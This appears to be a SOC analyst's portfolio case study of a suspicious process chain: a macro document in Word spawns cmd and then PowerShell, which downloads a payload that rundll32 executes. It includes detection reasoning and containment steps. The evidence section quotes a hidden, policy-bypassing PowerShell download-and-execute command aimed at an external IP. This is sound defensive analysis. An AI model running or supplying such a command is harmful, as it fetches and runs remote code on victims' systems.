# Scenario 1 — Suspicious Process Execution

---

## 1. Alert Summary

The alert was triggered due to a suspicious process chain where WINWORD.EXE (opened via Outlook) spawned cmd.exe, which subsequently launched powershell.exe.

The PowerShell execution included high-risk arguments such as -ExecutionPolicy Bypass, -NoProfile, -WindowStyle Hidden, and IEX (DownloadString), indicating stealth execution and the retrieval and execution of remote code, techniques commonly associated with malicious activity.

This activity resulted in an outbound network connection to 45.77.154.88, which has not been previously observed in the environment.

Given the abnormal parent-child relationship, use of living-off-the-land binaries, and remote code execution behavior, this activity is assessed as **likely malicious**.

---

## 2. Initial Context

- Host role: Accounts Payable workstation handling financial transactions and invoice processing  
- Typical user activity: Outlook, Excel, PDF viewing, and internal finance systems  
- Why this behavior deviates from baseline: This user has no legitimate need to execute command-line interpreters or PowerShell, making Office spawning cmd.exe and powershell.exe highly abnormal  

**Risk implication of this deviation:**

This behavior indicates potential phishing-driven code execution on a finance system, which is a high-value target due to access to financial data and payment workflows.  

Successful execution provides the attacker with the ability to perform data exfiltration, credential theft, or initiate financial fraud, resulting in both technical compromise and significant business impact.

---

## 3. SOC Case Note

### Alert Assessment

**Likely Malicious — Containment Required**

This assessment is based on the combination of an abnormal Office-to-shell execution chain, high-risk PowerShell command-line arguments, outbound network communication to an unknown external IP, and subsequent execution of a secondary process from a temporary directory.

---

### Key Observations

- Outlook launched WINWORD.EXE with a macro-enabled document (`.docm`)  
- WINWORD.EXE spawned `cmd.exe`  
- `cmd.exe` spawned `powershell.exe`  
- PowerShell executed with:
  - `-ExecutionPolicy Bypass`
  - `-NoProfile`
  - `-WindowStyle Hidden`
  - `IEX (DownloadString(...))`  
- PowerShell initiated an outbound connection to `45.77.154.88` over HTTP  
- A file was created in the user’s Temp directory (`ixP4A.tmp`)  
- `powershell.exe` spawned `rundll32.exe` to execute the downloaded payload  

---

### Investigation Reasoning

**Step 1 — Initial Execution Chain**

Outlook → WINWORD.EXE → cmd.exe → powershell.exe  

- Outlook indicates user interaction with an email  
- Word execution of a `.docm` file suggests macro-enabled content  
- Transition to `cmd.exe` indicates code execution triggered from within the document  
- Transition to PowerShell indicates use of a scripting engine for further execution  

This sequence strongly suggests phishing-driven macro execution leading to command and script execution.

---

**Step 2 — Office Spawning Command Interpreter**

- Word spawned: `cmd.exe`  

Office applications are expected to open and edit documents, not execute system-level commands.  

This behavior is commonly associated with malicious macros embedded in documents designed to execute commands on the host.

---

**Step 3 — PowerShell Command Analysis**

- `-ExecutionPolicy Bypass` → allows scripts to run without restriction from execution policies  
- `-NoProfile` → prevents loading of user/system profiles, reducing environmental visibility  
- `-WindowStyle Hidden` → executes PowerShell without visible user interface  

Command behavior:

- `IEX (Invoke-Expression)` → executes a string as code  
- `DownloadString` → retrieves content from a remote server  

This combination allows the attacker to download and execute remote code directly in memory without writing a file to disk, while avoiding user visibility and certain security controls.

---

**Step 4 — Network Activity**

- Destination IP: `45.77.154.88`  

This indicates outbound communication to an external system not previously observed in the environment.  

When combined with PowerShell execution, this strongly suggests command retrieval or payload delivery from an attacker-controlled source.

---

**Step 5 — Post-Execution Behavior**

- New process observed: `rundll32.exe`  

`rundll32.exe` is a legitimate Windows binary used to execute DLL functions.  

In this context, it is being used to execute a file from the Temp directory (`ixP4A.tmp`), indicating that PowerShell downloaded a payload which is now being executed using a living-off-the-land binary.

---

**Step 6 — Full Chain Interpretation**

This sequence shows a complete attack chain involving:

- Phishing email leading to macro execution  
- Macro launching command interpreter and PowerShell  
- PowerShell retrieving and executing remote code  
- Payload execution via `rundll32.exe`  

The attacker has likely achieved initial code execution on the host and successfully deployed a secondary payload.

---

### Decision

**Likely Malicious — Immediate containment required**

---

### Recommended Actions

**Immediate Actions:**

- Isolate the host from the network  
- Terminate malicious processes (`powershell.exe`, `rundll32.exe`)  
- Block outbound communication to `45.77.154.88`  

**Follow-up Actions:**

- Acquire and analyze the downloaded payload (`ixP4A.tmp`)  
- Review additional endpoint telemetry for lateral movement or persistence  
- Investigate email origin and identify other affected users  
- Reset credentials associated with the compromised user  

---

## 4. Key Takeaways

- Office applications spawning command interpreters is a high-confidence indicator of malicious macro activity  
- PowerShell with `IEX` and `DownloadString` is a strong indicator of fileless malware execution  
- Correlating process execution with network activity significantly increases detection confidence  
- Living-off-the-land binaries such as `rundll32.exe` are commonly used to evade detection  
- Full attack chains must be reconstructed to understand attacker intent and impact  

---

## 5. What This Demonstrates

- Ability to analyze endpoint telemetry (Sysmon + Windows logs)  
- Understanding of process execution chains and parent-child relationships  
- Interpretation of command-line arguments for threat detection  
- Identification of fileless malware techniques  
- Correlation of execution, network, and post-execution behavior  
- SOC-level reasoning and defensible incident assessment  

---

## 6. Evidence & Telemetry

### Process Chain — Office to PowerShell

```text
Parent: OUTLOOK.EXE
Child: WINWORD.EXE
Child: cmd.exe
Child: powershell.exe
```

---

### PowerShell Execution

```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://45.77.154.88/...')"
```

---

### Network Connection

```text
Process: powershell.exe
DestinationIp: 45.77.154.88
DestinationPort: 80
```

---

### File Creation

```text
C:\Users\...\Temp\ixP4A.tmp
```

---

### Payload Execution

```text
Process: rundll32.exe
Source: Temp directory payload
```

---
